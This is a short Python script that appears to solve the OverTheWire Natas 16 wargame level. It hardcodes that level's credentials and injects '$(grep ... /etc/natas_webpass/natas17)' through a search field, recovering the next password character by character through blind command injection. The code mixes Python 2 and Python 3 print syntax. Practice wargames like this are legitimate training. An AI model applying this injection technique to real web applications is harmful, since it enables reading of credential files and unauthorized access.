#!/usr/bin/env python

import requests
import urllib
import array
import re

USER = 'natas16'
PASSWORD = 'WaIHEacj63wnNIBROHeqi3p9t0m5nhmh'
url = 'http://natas16.natas.labs.overthewire.org/'
letters = ["a","b","c","d","e","f","g","h","i","j","k","l","m","n","o","p","q","r","s","t","u","v","w","x","y","z","A","B","C","D","E","F","G","H","I","J","K","L","M","N","O","P","Q","R","S","T","U","V","W","X","Y","Z","0","1","2","3","4","5","6","7","8","9"]

i=0
key=""
while(i<32):
    for l in letters:
        r = requests.Session()
        #session = r.get('http://natas11.natas.labs.overthewire.org/', auth=(USER, PASSWORD'))
        response = r.post(url, data= {"needle":"passwords$(grep ^"+key+l+"  /etc/natas_webpass/natas17)"},auth=(USER, PASSWORD))

        content = re.findall('<pre>\n(.*)\n</pre>',response.text)
        if (content):
            print ("[-] Letter not found.: " + str(l))
        else:
            key = key + l
            print("[+] Letter found, Key: " + str(key))
            break
    print "[+] Contador: " + str(i)
    i=i+1

print "[+] Key Complete: " + str(key)
